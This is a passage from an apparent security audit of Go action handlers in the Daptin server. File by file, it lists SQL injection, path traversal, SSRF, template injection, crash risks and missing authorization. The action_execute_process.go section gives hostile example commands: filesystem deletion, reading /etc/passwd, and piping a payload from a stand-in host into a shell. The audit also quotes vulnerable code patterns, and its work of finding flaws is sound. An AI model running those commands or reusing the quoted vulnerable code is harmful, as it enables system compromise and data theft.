- **Header injection:** Email headers constructed without injection protection

---

## server/actions/action_mail_servers_sync.go

### 🚨 Security Vulnerabilities
- **Line 87:** Private keys written to temp files with 0666 permissions (world-readable/writable)
- **Lines 78, 82:** Certificate files written with overly permissive 0666 permissions
- **Temp file cleanup:** Certificate files may remain in temp directory after use

### ⚠️ Runtime Safety Issues
- **Lines 61, 109, 120:** Panic-prone type assertions with no error handling
- **Lines 54-55:** strconv.ParseInt errors silently ignored
- **Missing error propagation:** Certificate generation errors logged but don't stop processing

### 🔐 Configuration Security
- **No input validation:** Mail server configuration values not validated before use
- **Wildcard host:** Adds "*" to allowed hosts without restriction
- **File path injection:** Hostname used directly in file paths without sanitization
- **Path traversal risk:** Hostname used in file paths without validation

---

## server/actions/action_make_response.go

### ⚠️ Runtime Safety Issues
- **Line 31:** Type assertion `responseType.(string)` can panic if responseType is not string type
- **No input validation:** responseType value not validated before use in response creation

### 🔐 Security Concerns
- **Arbitrary response creation:** Allows creation of responses with any type and data without validation
- **No access control:** No checks on what types of responses can be created
- **Data pass-through:** Passes input data directly to response without sanitization

### 🏗️ Design Issues
- **Unused parameter:** Database transaction provided but never used
- **Missing error handling:** No validation of input parameters or response creation process
- **Misleading comments:** Comments reference "become administrator" functionality which is incorrect

---

## server/actions/action_network_request.go

### 🚨 Compilation Errors
- **Lines 80, 81, 105, 113:** `json.Marshal` and `json.Unmarshal` used without importing `encoding/json`

### ⚠️ Runtime Safety Issues
- **Multiple type assertions** (lines 29, 31, 39, 47, 56, 63, 65, 73): Can panic if types don't match expected types
- **Recursive processing:** Deep nesting in encodeQuery could cause stack overflow
- **Circular reference vulnerability:** No protection against circular data structures in reflection code

### 🚨 Critical Security Vulnerabilities
- **Server-Side Request Forgery (SSRF):** Makes uncontrolled requests to user-specified URLs without validation
- **No URL validation:** No checks for malicious or internal URLs
- **Debug logging exposure:** Logs sensitive request/response data (lines 49-50, 120)
- **No rate limiting:** No protection against request abuse or DoS attacks
- **Response size limits:** No limits on response body size (potential memory exhaustion)

### 🌐 Network Security Issues
- **No timeout configuration:** HTTP requests have no timeout (potential hanging)
- **Certificate validation:** No explicit TLS certificate validation
- **Proxy bypass:** No controls to prevent requests through proxies

---

## server/actions/action_oauth_login_begin.go

### ⚠️ Runtime Safety Issues
- **Line 41:** Type assertion `inFieldMap["authenticator"].(string)` can panic if field missing or wrong type
- **Line 52:** `resource.CheckErr()` may panic instead of returning error gracefully

### 🔐 Security Concerns
- **Debug output exposure:** OAuth authorization URL printed to stdout (line 63) in production
- **Predictable state generation:** TOTP-based state may be predictable with known secret
- **State reuse potential:** TOTP state valid for 5-minute window with 1-skew tolerance
- **Secret storage:** TOTP secret stored in database without additional encryption
- **Hardcoded credentials:** TOTP issuer and account hardcoded to daptin.com

### 🔑 OAuth Security Issues
- **No PKCE implementation:** No Proof Key for Code Exchange for additional security
- **Insufficient secret entropy:** 10-byte TOTP secret may be insufficient
- **No redirect URI validation:** No validation of OAuth redirect URIs
- **Client-side state storage:** OAuth state stored in client without server-side tracking

---

## server/actions/action_oauth_login_response.go

### ⚠️ Runtime Safety Issues
- **Multiple type assertion panics** (lines 62, 63, 71, 79, 82, 84, 85, 94, 108, 109): Can panic if database fields missing or wrong type
- **Line 129:** `resource.CheckErr()` may panic instead of returning error
- **Array bounds assumption:** Uses `rows[0]` after length check but potential race conditions

### 🔐 Security Concerns
- **OAuth config logging** (line 55): OAuth configuration including secrets printed to logs
- **Token exposure in client storage** (line 141): Access token stored in client-side storage without encryption
- **No token validation:** OAuth tokens not validated before storage
- **Secret exposure in logs:** Debug output may expose sensitive OAuth configuration

### 🔑 OAuth Security Issues
- **No PKCE validation:** No Proof Key for Code Exchange validation
- **State reuse window:** TOTP state valid for 5-minute window with skew tolerance
- **No authorization code validation:** Authorization codes not validated before exchange
- **No token expiry handling:** No validation or handling of token expiry during exchange

### 🌐 External Dependencies
- **No timeout on token exchange:** OAuth token exchange has no timeout configuration
- **Context management:** Background context used without timeout or cancellation

---

## server/actions/action_oauth_profile_exchange.go

### 🚨 Compilation Errors
- **Line 71:** `json.Unmarshal()` used without importing `encoding/json` package

### ⚠️ Runtime Safety Issues
- **Multiple type assertion panics** (lines 86, 87, 98, 103, 115): Can panic if fields missing or wrong type
- **Line 99:** `resource.CheckErr()` may panic instead of returning error
- **Variable shadowing** (line 113): Creates new oauthToken variable that shadows outer scope variable

### 🔐 Security Concerns
- **Debug logging exposure** (lines 30, 70, 108): OAuth URLs and responses logged to stdout in production
- **Token exposure in logs:** Access tokens and responses logged without redaction
- **No input validation:** OAuth parameters not validated before use
- **No response validation:** HTTP status codes not checked before processing

### 🌐 HTTP Implementation Issues
- **Incorrect content type:** Sets form content type for GET request expecting JSON response
- **Request body on GET:** Sends body with GET request (violates HTTP specification)
- **No retry logic:** No handling of network failures or retries

### 🔑 OAuth Implementation Issues
- **No scope validation:** OAuth scopes not properly validated or used
- **Token expiry handling:** Complex and potentially incorrect expiry time calculation
- **Profile exchange logic:** Unclear and potentially flawed profile exchange workflow

---

## server/actions/action_otp_generate.go

### ⚠️ Runtime Safety Issues
- **Multiple type assertion panics** (lines 42, 50, 78, 79, 90, 136): Can panic if database fields missing or wrong type
- **Line 162:** Encryption secret retrieval error silently ignored

### 🔐 Security Concerns
- **Weak OTP security:** 4-digit OTP provides only 10,000 combinations (easily brute-forced)
- **Long validity window:** 300-second period with 1-skew tolerance creates 10-minute attack window
- **No rate limiting:** No protection against OTP generation/brute-force attacks
- **Insufficient secret entropy:** 10-byte TOTP secret may be insufficient
- **No audit logging:** OTP generation not logged for security monitoring

### 🏗️ Design Issues
- **Hardcoded values:** Issuer hardcoded to "site.daptin.com"
- **Mock HTTP requests:** Creates artificial HTTP requests for internal API operations
- **Complex user lookup logic:** Overly complex email/mobile lookup with duplicate code paths

---

## server/actions/action_otp_login_verify.go

### 🚨 Critical Security Vulnerabilities
- **JWT token exposure** (line 155): JWT tokens printed to stdout in production - **MAJOR SECURITY BREACH**
- **Silent error ignoring** (lines 84, 175): Critical decryption errors silently ignored

### ⚠️ Runtime Safety Issues
- **Multiple type assertion panics** (lines 61, 68, 84, 95, 124, 125, 148): Can panic if database fields missing or wrong type
- **CheckErr panic risk** (lines 178, 181, 186): `resource.CheckErr()` calls may panic instead of returning error
- **Time operation bug** (line 87): `time.Add()` result not assigned, skew calculation ineffective

### 🔐 Authentication Security Issues
- **Weak OTP security:** 4-digit OTP provides only 10,000 combinations (easily brute-forced)
- **No rate limiting:** No protection against OTP brute-force attacks
- **Long validity window:** 300-second period with skew tolerance
- **No failed attempt tracking:** No tracking or limiting of failed OTP attempts

### 🎫 JWT Implementation Issues
- **Token exposure in logs:** JWT tokens logged to stdout accessible to all system users
- **No token revocation:** No mechanism to revoke issued JWT tokens
- **Long token lifetime:** Default 72-hour token lifetime may be excessive

---

## server/actions/action_random_value_generate.go

### ⚠️ Runtime Safety Issues
- **Line 26:** Type assertion `inFields["type"].(string)` can panic if field missing or wrong type
- **Line 27:** Map access `resource.ColumnManager.ColumnMap[randomType]` can panic if key doesn't exist
- **Line 27:** Method call `.Fake()` can panic if column type is nil or doesn't implement method
- **No error handling:** No error handling for any operations that could fail

### 🔐 Security Concerns
- **No input validation:** randomType parameter not validated before use
- **Unlimited access:** No restrictions on what types of random values can be generated
- **No access control:** No authentication or authorization checks
- **Potential information disclosure:** Could expose internal column type structure

### 🏗️ Design Issues
- **Type name typo:** "randomValueGeneratePerformerr" has extra 'r'
- **Unused struct field:** cruds field declared but never used
- **Copy-paste comments:** Comments reference "becomeAdmin" functionality (incorrect)
- **Global dependency:** Directly accesses global ColumnManager without injection

---

## server/actions/action_rename_column.go

### 🚨 Compilation Errors
- **Lines 55, 75:** `json.Unmarshal()` and `json.Marshal()` used without importing `encoding/json` package

### 🚨 Critical Security Vulnerabilities
- **SQL injection** (line 77): Table and column names concatenated directly into SQL without validation or escaping
- **No input validation:** Column and table names not validated for SQL injection attacks

### ⚠️ Runtime Safety Issues
- **Multiple type assertion panics** (lines 26, 27, 28, 52): Can panic if fields missing or wrong type
- **Transaction consistency:** If ALTER TABLE succeeds but config update fails, creates inconsistent state

### 🗄️ Database Safety Issues
- **No transaction rollback:** Database schema changes not properly rolled back on failure
- **Production schema modification:** Directly modifies production database schema without safeguards
- **No backup validation:** No verification that column rename is safe or reversible

### 🔐 Access Control Issues
- **No authorization checks:** No validation that user has permission to alter database schema
- **No audit logging:** Schema changes not logged for audit purposes
- **Unlimited access:** Can rename any column in any world table without restrictions

---

## server/actions/action_render_template.go

### 🚨 Compilation Errors
- **Line 50:** `json.Unmarshal()` used without importing `encoding/json` package

### 🚨 Critical Security Vulnerabilities
- **Template injection** (line 137): User-controlled template content executed - **POTENTIAL REMOTE CODE EXECUTION**
- **Path traversal** (lines 78, 111, 166): File paths not validated for ".." or absolute paths
- **Arbitrary file access** (lines 93, 126): Can read any file accessible to the application

### ⚠️ Runtime Safety Issues
- **Multiple type assertion panics** (lines 35, 44, 45, 46): Can panic if database fields missing or wrong type
- **Error ignored** (line 190): Encryption secret retrieval error silently ignored

### 🔐 File System Security Issues
- **No access control:** No validation of file permissions or access rights for subsite/site files
- **No file size limits:** Could read extremely large files causing memory exhaustion
- **No file type validation:** Could read any file type including sensitive system files
- **Deprecated function:** Uses `ioutil.ReadFile()` instead of `os.ReadFile()`

### 🎨 Template Security Issues
- **User data injection:** User input passed directly to template execution without sanitization
- **Template function exposure:** Exposes soha function map without restrictions
- **No template validation:** No validation of template syntax or safety before execution

---

## server/actions/action_restart_system.go

### 🚨 Functional Misrepresentation
- **Misleading action name:** Named "__restart" but performs no system restart functionality
- **False messaging:** Claims "Initiating system update" but performs no update
- **Incomplete implementation:** Commented imports suggest intended but unimplemented restart functionality

### 🔐 Security Concerns
- **No access control:** No authentication or authorization checks for system restart action
- **No validation:** No validation that user has permission to restart system
- **Misleading users:** Could trick users into thinking system is restarting when it's not

### 🏗️ Design Issues
- **Unused struct field:** responseAttrs declared but never used
- **Unused parameters:** All function parameters ignored
- **Hardcoded values:** All response values hardcoded with no customization options

---

## server/actions/action_site_file_get.go

### ⚠️ Runtime Safety Issues
- **Line 28:** Type assertion `inFields["path"].(string)` can panic if field missing or wrong type
- **Line 43:** File retrieval error silently ignored
- **Resource leak potential:** Deferred close may not execute if early returns occur

### 🔐 Security Concerns
- **Path traversal vulnerability:** File path not validated for "../" or absolute paths
- **No access control:** No validation of file access permissions or user authorization
- **Arbitrary file access:** Can potentially access any file in site cache folders
- **No input sanitization:** File path used directly without validation

### 💾 Resource Management Issues
- **Memory consumption:** Loads entire file into memory before size validation
- **10MB limit bypass:** Uses LimitReader but reads all data first, defeating the purpose
- **Base64 overhead:** Base64 encoding increases memory usage by ~33%

---

## server/actions/action_site_file_list.go

### ⚠️ Runtime Safety Issues
- **Line 24:** Type assertion `inFields["path"].(string)` can panic if field missing or wrong type
- **Silent error ignoring** (lines 26, 40): Site cache and directory contents errors silently ignored

### 🔐 Security Concerns
- **Path traversal vulnerability:** Directory path not validated for "../" or absolute paths
- **No access control:** No validation of directory access permissions or user authorization
- **Information disclosure:** Exposes directory structure and file listings without restrictions
- **Directory enumeration:** Allows enumeration of site cache directory contents

### 🔒 Access Control Issues
- **No authentication:** No verification of user identity or permissions
- **No authorization:** No checks for directory access rights
- **Site boundary bypass:** No validation that user has access to specific site
- **No audit logging:** Directory access not logged for security monitoring

---

## Issues Summary by Category

### **High Priority (Potential Crashes)**
1. Multiple unhandled type assertion panics across all files
2. Resource leaks in file handling code
3. Unlimited goroutine creation

### **Security Issues**
1. Path/directory traversal vulnerabilities  
2. Zip slip vulnerability in extraction
3. Credential exposure in global config
4. Predictable temporary file naming

### **Medium Priority (Logic/Reliability)**
1. Inconsistent error handling patterns
2. Success responses returned despite failures
3. Race conditions in cleanup mechanisms
4. Memory usage issues with large files

### **Low Priority (Code Quality)**
1. Unused parameters
2. Misleading error messages
3. Global state management issues
4. Missing input validation

---

## server/actions/action_cloudstore_folder_create.go

### Critical Issues
- **Line 45:** Type assertion `inFields["root_path"].(string)` can panic if field missing or wrong type
- **Line 60:** Type assertion `credentialName.(string)` can panic inside if statement
- **Line 56:** `strings.Split(rootPath, ":")[0]` could panic if `rootPath` is empty string

### Security Issues
- **Path traversal:** No validation on `folderPath` construction - could allow creating folders outside intended directory
- **Empty folder names:** No validation prevents creating folders with empty or invalid names

### Logic Issues
- **Silent failures:** Lines 43-44 use `_, _` pattern ignoring type assertion errors, resulting in empty strings
- **Unnecessary temp directory:** Creates temp directory but doesn't use it for folder creation operation
- **Success response regardless:** Always returns success even if `operations.Mkdir()` fails
- **No error propagation:** Goroutine errors don't affect the returned response

### Resource Issues
- **Temporary directory waste:** Creates unnecessary temp directory for simple mkdir operation
- **Misleading response message:** Says "file upload queued" for folder creation operation

---

## server/actions/action_cloudstore_path_move.go

### Critical Issues
- **Line 46:** Type assertion `inFields["root_path"].(string)` can panic if field missing or wrong type
- **Line 65:** Type assertion `credentialName.(string)` can panic inside if statement
- **Line 62:** `strings.Split(rootPath, ":")[0]` could panic if `rootPath` is empty string

### Security Issues
- **Path traversal:** No validation on source/destination path construction - could allow moving files outside intended directories
- **Path injection:** No sanitization of `sourcePath` and `destinationPath` parameters
- **Self-move vulnerability:** No check prevents moving path to itself (could cause data loss)

### Logic Issues
- **Silent failures:** Lines 44-45 use `_, _` pattern ignoring type assertion errors, resulting in empty strings
- **Redundant filesystem creation:** Line 74 creates `fsrc` that's immediately replaced on line 85
- **Error masking:** Line 98 returns `nil` instead of actual error, hiding move operation failures
- **Inconsistent execution:** Runs synchronously unlike other cloud store actions that use goroutines
- **Unnecessary temp directory:** Creates temp directory but never uses it for the operation

### Resource Issues
- **Blocking operation:** Synchronous execution can block request processing
- **Temporary directory waste:** Creates unnecessary temp directory for simple move operation
- **Incomplete cleanup:** Only removes temp directory on error, not on success

### Data Integrity Issues
- **No validation:** Missing checks for empty paths, same source/destination, or path existence
- **Destructive operation:** Move operation is destructive but has minimal error handling

---

## server/actions/action_cloudstore_site_create.go

### Critical Issues
- **Line 47:** Type assertion `inFields["user_account_id"].(string)` can panic if field missing or wrong type
- **Line 49:** Type assertion `inFields["cloud_store_id"].(string)` can panic if field missing or wrong type
- **Line 61:** Type assertion `inFields["root_path"].(string)` can panic if field missing or wrong type
- **Line 66:** Type assertion `inFields["path"].(string)` can panic if field missing or wrong type
- **Line 114:** Type assertion `credentialName.(string)` can panic inside if statement
- **Line 110:** `strings.Split(rootPath, ":")[0]` could panic if `rootPath` is empty

### Security Issues - HIGH SEVERITY
- **Command injection vulnerability:** Line 55 passes `tempDirectoryPath` directly to `hugoCommand.Execute()` without validation
- **Path traversal:** No validation on path construction or Hugo site generation directory
- **External command execution:** Hugo commands executed with user-controlled input

### Data Integrity Issues
- **UUID parsing errors ignored:** Lines 47, 49 ignore UUID parsing errors, could result in zero/invalid UUIDs in database
- **Silent type assertion failure:** Line 46 ignores error for `site_type`, could create sites with empty type
- **No duplicate validation:** No check for existing sites with same hostname
- **Inconsistent state:** If site creation fails after Hugo generation, temp files remain without cleanup

### Logic Issues
- **Database transaction scope:** Database operations and file operations not properly coordinated
- **Error handling inconsistency:** Some operations return errors, others just log and continue
- **Resource cleanup:** Temp directory cleanup only happens in goroutine, not guaranteed on errors

### Input Validation Issues
- **Missing hostname validation:** Only checks existence, not format or validity
- **No path sanitization:** Paths used without validation for both file system and database operations
- **No site_type validation:** Accepts any string, could cause issues with unsupported types

---

## server/actions/action_column_sync_storage.go

### Critical Issues
- **Line 53:** Type assertion `credentialName.(string)` can panic if credential_name field is not string type
- **Line 50:** `strings.Split(cloudStore.RootPath, ":")[0]` could panic if RootPath is empty string
- **Line 45:** No null check on `cacheFolder.CloudStore` - could cause panic when accessing cloudStore fields

### Security Issues
- **Path injection:** No validation on `cacheFolder.Keyname` - could contain "../" or other path traversal sequences
- **Cache poisoning:** No validation that cache folder paths are within expected directories

### Logic Issues
- **Redundant null checks:** Lines 78-81 and 84-87 perform identical fsrc/fdst null checks
- **Success response regardless:** Always returns success even if sync operation fails in goroutine
- **No error propagation:** Goroutine errors don't affect the returned response
- **Nested map access:** Line 41 `AssetFolderCache[tableName][columnName]` has no bounds checking for intermediate map

### Resource Issues
- **Unbounded goroutines:** Each sync request creates a new goroutine without limiting concurrency
- **No sync status tracking:** No way to monitor or cancel ongoing sync operations

### Data Integrity Issues
- **No cache validation:** No verification that local sync path exists or is writable
- **No conflict resolution:** No handling of sync conflicts or partial failures

---

## server/actions/action_csv_to_entity.go

### COMPILATION ERRORS - CRITICAL
- **Line 194:** `json.Marshal()` called but `json` package not imported - **CODE WILL NOT COMPILE**
- **Line 214:** `successResponses` variable undefined - **CODE WILL NOT COMPILE**
- **Line 216:** `failedResponses` variable undefined - **CODE WILL NOT COMPILE**
- **Undefined globals:** `EntityTypeToColumnTypeMap`, `entityTypeToDataTypeMap`, `SmallSnakeCaseText` used but not defined

### Critical Issues
- **Line 37:** Type assertion `inFields["data_csv_file"].([]interface{})` can panic if field missing or wrong type
- **Line 39:** Type assertion `inFields["entity_name"].(string)` can panic if field missing or wrong type
- **Line 77:** Type assertion `file["name"].(string)` can panic if field missing or wrong type
- **Line 78:** Type assertion `file["file"].(string)` can panic if field missing or wrong type
- **Line 79:** `strings.Split(..., ",")[1]` can panic if split results in less than 2 elements
- **Line 87:** Uses `schemaFolderDefinedByEnv` without null check - could panic if environment variable not set

### Security Issues - HIGH SEVERITY
- **Path traversal:** No validation on file names - could contain "../" sequences allowing writes outside intended directory
- **File permissions:** Creates files with 0644 permissions which may be too permissive
- **Memory exhaustion:** Loads entire CSV files into memory without size limits - could cause DoS
- **Arbitrary file write:** Combines unvalidated filename with file system paths

### Logic Issues
- **Infinite loop potential:** Count mechanism (line 131) could hang on large datasets
- **Path construction bugs:** Line 87 path concatenation could result in double separators or invalid paths
- **Array bounds:** Line 79 assumes comma-split will have at least 2 elements

### Data Integrity Issues
- **No CSV validation:** Accepts any base64 content as CSV without format validation
- **Type detection flaws:** Falls back to varchar(100) on any type detection error
- **No transaction rollback:** File writes and database operations not coordinated - partial failures leave inconsistent state

### Resource Issues
- **Unbounded memory usage:** No limits on CSV file size or number of records processed
- **File system pollution:** Failed operations leave orphaned files on disk
- **No cleanup on errors:** Temporary files not removed if processing fails

---

## server/actions/action_delete_column.go

### COMPILATION ERRORS - CRITICAL
- **Lines 41, 73:** `json.Unmarshal()` and `json.Marshal()` called but `json` package not imported - **CODE WILL NOT COMPILE**

### Critical Issues  
- **Line 26:** Type assertion `inFields["world_name"].(string)` can panic if field missing or wrong type
- **Line 27:** Type assertion `inFields["column_name"].(string)` can panic if field missing or wrong type
- **Line 41:** Type assertion `schemaJson.(string)` can panic if field is not string

### Security Issues - CRITICAL SEVERITY
- **SQL injection vulnerability (Line 75):** Direct string concatenation in SQL query:
  ```sql
  "alter table " + tableSchema.TableName + " drop column " + columnToDelete
  ```
  - **Risk:** `tableSchema.TableName` and `columnToDelete` could contain malicious SQL
  - **Impact:** Could allow arbitrary SQL execution, data theft, or database corruption
  - **Attack vector:** Malicious table/column names in input parameters

### Authorization Issues
- **No permission validation:** Gets user from context but doesn't verify column deletion permissions
- **Destructive operation allowed:** Irreversible column deletion with minimal security checks

### Data Integrity Issues - HIGH SEVERITY
- **Transaction coordination failure:** Schema update and SQL DDL operations not properly coordinated
- **No cascade validation:** Doesn't check for foreign keys, indexes, or constraints that depend on the column
- **Irreversible data loss:** All data in deleted column permanently lost without confirmation
- **Partial failure states:** If schema update fails after SQL execution, database left in inconsistent state

### Logic Issues
- **No existence validation:** Only checks if column found in schema, not if it actually exists in database
- **No type checking:** `tableData["world_schema_json"]` could be nil or wrong type causing further panics

---

## server/actions/action_delete_table.go

### COMPILATION ERRORS - CRITICAL
- **Lines 60, 122, 138:** `json.Unmarshal()` and `json.Marshal()` called but `json` package not imported - **CODE WILL NOT COMPILE**

### Critical Issues
- **Line 57:** No type checking on `tableData.GetAttributes()["world_schema_json"]` - could be nil causing panic
- **Line 60:** Type assertion `schemaJson.(string)` can panic if field is not string type
- **Line 122:** Type assertion `otherTableData["world_schema_json"].(string)` can panic if field is nil or wrong type
- **Line 160:** Type assertion `tableData.GetAttributes()["table_name"].(string)` can panic if field is nil or wrong type
- **Line 157:** `uuid.MustParse()` will panic if ID is not valid UUID format

### Security Issues - CRITICAL SEVERITY
- **Multiple SQL injection vulnerabilities from direct string concatenation:**
  - **Line 77:** `"alter table " + relation.Subject + " drop column " + relation.ObjectName`
  - **Line 87:** `"alter table " + relation.Subject + " drop column " + relation.ObjectName`
  - **Line 95:** `"drop table " + relation.GetJoinTableName()`
  - **Line 160:** `"drop table " + tableData.GetAttributes()["table_name"].(string)`
  - **Risk:** All table/column names inserted without escaping - could allow arbitrary SQL execution
  - **Impact:** Database corruption, data theft, privilege escalation
  - **Attack vector:** Malicious table/column names in database records

### Authorization Issues
- **No permission validation:** Gets user from context but doesn't verify table deletion permissions
- **Destructive operation allowed:** Irreversible table deletion with all data loss and minimal security checks

### Data Integrity Issues - HIGH SEVERITY
- **Transaction coordination failure:** Multiple DDL operations not properly coordinated - partial failures could leave database in inconsistent state
- **Cascade deletion complexity:** Handles relations but may miss complex dependency chains
- **Irreversible data loss:** All data in deleted tables permanently lost without confirmation
- **Error accumulation:** Continues processing even after SQL errors, could compound issues

### Logic Issues
- **Insufficient relation handling:** May not properly handle all relation types or complex multi-table dependencies
- **Partial cleanup:** If table deletion fails after relation cleanup, database left in inconsistent state
- **No rollback mechanism:** Failed operations don't restore previous state

---

## server/actions/action_download_cms_config.go

### COMPILATION ERRORS - CRITICAL
- **Line 34:** `json.MarshalIndent()` called but `json` package not imported - **CODE WILL NOT COMPILE**

### Security Issues - HIGH SEVERITY
- **Information disclosure vulnerability:** Entire CMS configuration exposed for download including potentially sensitive data:
  - Database credentials and connection strings
  - API keys and authentication tokens
  - Internal system paths and configuration details
  - Third-party service credentials
- **No access control:** No validation of who can download the configuration - any user with action access can retrieve sensitive system data
- **Configuration exposure:** Complete system configuration made available through simple action call

### Data Security Issues
- **Sensitive data in logs:** Configuration marshaling errors logged but may expose sensitive config fragments
- **Memory exposure:** Full configuration held in memory during base64 encoding process
- **Persistent exposure:** Configuration data embedded in response and potentially cached

### Authorization Issues
- **Missing permission checks:** No validation that requesting user has administrative privileges
- **Unrestricted access:** Any authenticated user can potentially download complete system configuration
- **Administrative data exposure:** System-level configuration accessible through user actions

---

## server/actions/action_enable_graphql.go

### Critical Issues - RUNTIME PANIC GUARANTEED
- **Line 37:** `err.Error()` called when `err` is nil - **WILL CAUSE PANIC AT RUNTIME**
  - In else block (lines 35-37), `err` is guaranteed to be nil but `err.Error()` is called
  - This will crash the application whenever GraphQL enabling succeeds

### Logic Errors - CRITICAL SEVERITY
- **Lines 30-38:** **Inverted success/failure logic** - responses are completely backwards:
  - When configuration update FAILS (`err != nil`): Returns SUCCESS notification "Restarting with graphql enabled"  
  - When configuration update SUCCEEDS (`err == nil`): Returns FAILURE notification "Failed to update config"
  - This means users get incorrect feedback about whether GraphQL was actually enabled

### Security Issues
- **No authorization checks:** Any authenticated user can enable GraphQL without administrative privileges
- **System-wide configuration change:** Allows non-administrators to modify global system settings
- **GraphQL exposure:** Enables GraphQL endpoint which exposes complete database schema and data access

### Functional Issues
- **Disabled restart mechanism:** Line 31 has commented out restart call - GraphQL enabling may not take effect without manual restart
- **Configuration persistence:** Changes stored in database but may not be applied to running system
- **No rollback:** Failed configuration changes leave system in undefined state

### Code Quality Issues
- **Unused parameters:** `request` and `inFieldMap` parameters completely ignored in DoAction()
- **Unused parameter:** `initConfig` parameter ignored in NewGraphqlEnablePerformer()
- **Misleading comments:** Line 13 comment mentions "Become administrator" but this enables GraphQL

---

## server/actions/action_execute_process.go

### **CRITICAL SECURITY VULNERABILITY - REMOTE CODE EXECUTION**
- **SEVERITY: MAXIMUM - IMMEDIATE SYSTEM COMPROMISE RISK**
- **Lines 34-37, 42:** **Arbitrary command execution vulnerability:**
  ```go
  command := inFieldMap["command"].(string)
  args := inFieldMap["arguments"].([]string)
  execution := exec.Command(command, args...)
  err = execution.Run()
  ```
  - **Risk:** Any authenticated user can execute ANY system command
  - **Impact:** Complete system compromise, data theft, malware installation, lateral movement
  - **Attack vector:** Simple API call with malicious command parameters
  - **Examples of potential abuse:**
    - `rm -rf /` - Delete entire filesystem
    - `cat /etc/passwd` - Extract user accounts
    - `curl malicious-site.com/payload | sh` - Download and execute malware
    - Database credential extraction, network reconnaissance, etc.

### Critical Issues - RUNTIME PANICS
- **Line 34:** Type assertion `inFieldMap["command"].(string)` can panic if field missing or wrong type
- **Line 35:** Type assertion `inFieldMap["arguments"].([]string)` can panic if field missing or wrong type

### Security Issues - ADDITIONAL CRITICAL CONCERNS
- **No authorization checks:** Any authenticated user can execute system commands
- **No input validation:** Command and arguments used directly without sanitization
- **No sandboxing:** Commands execute with full application privileges
- **No timeouts:** Long-running commands can cause resource exhaustion
- **No path restrictions:** Can execute any binary accessible to the application
- **Output exposure:** All command output returned to client, could leak sensitive system information

### Logic Issues
- **Error handling bugs:** Variables `err` overwritten multiple times (lines 39-40, 44-45)
- **Unused resources:** Database cruds field never used but stored
- **Missing error checks:** StdoutPipe() and StderrPipe() errors ignored

### Data Exposure Issues
- **Command output leak:** Both stdout and stderr returned to client regardless of content
- **Error information disclosure:** System error messages exposed to client
- **Process information leak:** Command execution details visible to requestor

**THIS VULNERABILITY REPRESENTS AN IMMEDIATE AND EXTREME SECURITY RISK REQUIRING URGENT REMEDIATION**

---

## server/actions/action_export_csv_data.go

### Critical Issues - RUNTIME PANICS
- **Line 38:** Type assertion `tableName.(string)` can panic if table_name parameter is not string type
- **Line 72:** Type assertion `contents.([]map[string]interface{})` can panic if database returns unexpected data structure
- **Line 80:** Array access `contentArray[0]` can panic if contentArray is empty despite line 74 check for length

### Security Issues - DATA EXPOSURE
- **Unrestricted data export:** No authorization checks - any authenticated user can export complete database
- **All table access:** Can export all tables in system by omitting table_name parameter
- **Sensitive data exposure:** Exports all columns including potentially sensitive data (passwords, tokens, personal information)
- **No field-level access control:** Exports complete rows without filtering sensitive columns

### Logic Issues
- **No table validation:** Requested table name not validated against configured tables - could cause errors or expose unexpected data
- **Partial failure handling:** Database errors logged but export continues with incomplete data
- **Column ordering inconsistency:** Map iteration order not deterministic, CSV column order varies between exports
- **Empty dataset handling:** Line 80 access `contentArray[0]` after checking length but before confirming non-empty in different code path

### Resource Issues
- **Memory consumption:** Large datasets loaded entirely into memory before CSV conversion - potential out-of-memory for large tables
- **Temporary file accumulation:** Files created in temp directory but not explicitly deleted, only closed
- **Transaction duration:** Long-running data export operations hold database transactions, potentially causing locks
- **No size limits:** No restrictions on export size, could cause system resource exhaustion

### Data Quality Issues
- **Data type conversion:** All values converted to string using `fmt.Sprintf("%v")` - may lose precision for numeric/date types
- **No data validation:** Exported data not validated for consistency or completeness
- **Error masking:** Individual table export errors logged but don't fail the overall operation

---

## server/actions/action_export_data.go

### COMPILATION ERRORS - CRITICAL
- **Line 87:** `json.Unmarshal()` called but `json` package not imported - **CODE WILL NOT COMPILE**
- **Line 110:** `CreateStreamingExportWriter(format)` called but function not defined/imported - **CODE WILL NOT COMPILE**

### Critical Issues - RUNTIME PANICS
- **Line 52:** Type assertion `formatStr.(string)` can panic if format parameter is not string type
- **Line 99:** Type assertion `tableName.(string)` can panic if table_name parameter is not string type
- **Line 119:** Duplicate type assertion `tableName.(string)` - redundant but could panic again

### Security Issues - DATA EXPOSURE AND ACCESS CONTROL
- **Unrestricted data export:** No authorization checks - any authenticated user can export complete database in multiple formats
- **All table access:** Can export all configured tables by omitting table_name parameter
- **Sensitive data exposure:** Exports all columns including potentially sensitive data without field-level filtering
- **Format variety increases attack surface:** Multiple export formats (JSON, CSV, XLSX, PDF, HTML) provide different data exposure vectors
- **No column validation:** Can request any column names without verification they exist

### Logic Issues
- **Missing function dependency:** `CreateStreamingExportWriter()` function undefined - suggests missing import or incomplete implementation
- **Duplicate type assertions:** Line 119 repeats assertion from line 99 unnecessarily
- **Error masking:** Individual table export errors logged but don't fail overall operation
- **Format validation gap:** No validation that requested format is actually supported
- **Column ordering inconsistency:** Map iteration (line 174) produces non-deterministic column ordering

### Resource Issues
- **Memory consumption paradox:** Uses streaming approach but loads entire final content into memory for base64 encoding
- **Transaction duration:** Long-running export operations hold database transactions, potentially causing locks
- **No size limits:** No restrictions on export size across multiple formats
- **Callback complexity:** Complex pagination callback pattern (lines 158-166) with potential for nested errors

### Data Integrity Issues
- **Column existence:** No validation that requested columns actually exist in target tables
- **Type conversion:** No handling of data type compatibility across different export formats
- **Partial export success:** Continues exporting even when individual tables fail, resulting in incomplete datasets

### Code Quality Issues
- **Ignored error values:** Line 62 uses `_` pattern to ignore type assertion errors
- **Complex branching:** Column selection logic (lines 79-95) has multiple code paths with different parsing approaches
- **Inconsistent error handling:** Some errors cause function return, others just log and continue

---

## server/actions/action_generate_acme_tls_certificate.go

### Critical Issues - RUNTIME PANICS
- **Line 90:** Type assertion `userAccount["email"].(string)` can panic if email field is not string
- **Line 98:** Type assertion `userAccount["id"].(int64)` can panic if id field is not int64 or is nil
- **Line 110:** Type assertion `inFieldMap["certificate"].(map[string]interface{})` can panic if certificate parameter is not map
- **Line 111:** Type assertion `certificateSubject["hostname"].(string)` can panic if hostname field is not string
- **Line 225:** String split operation assumes specific certificate format - could panic if malformed certificate returned

### Security Issues - CRITICAL SEVERITY
- **TLS Security Bypass (Line 181):** `InsecureSkipVerify: true` in TLS configuration
  - **Risk:** Disables certificate verification for ACME client connections
  - **Impact:** Vulnerable to man-in-the-middle attacks during certificate generation
